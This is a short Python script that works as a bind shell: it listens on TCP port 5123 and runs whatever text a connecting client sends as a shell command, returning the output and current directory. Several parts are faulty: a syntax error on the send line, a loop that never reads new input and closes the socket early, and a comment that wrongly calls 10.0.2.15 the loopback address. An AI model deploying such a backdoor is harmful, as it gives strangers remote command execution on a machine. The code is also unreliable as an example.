
import socket
import os
import subprocess
HOST = '10.0.2.15'  # Standard loopback interface address (localhost)
PORT = 5123        # Port to listen on (non-privileged ports are > 1023)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((HOST, PORT))
s.listen()
conn, addr = s.accept()
data = conn.recv(1024).decode('UTF-8')
print('Connected by', addr)
while True:
    if not data:
        break
    if len(data) > 0:
        proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE,
                                stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        stdout_value = proc.stdout.read() + proc.stderr.read()
        output_str = str(stdout_value, 'UTF-8')
        currentWD = os.getcwd() + '>'
        conn.send((currentWD + output_str).encode('UTF-8')
    s.close()
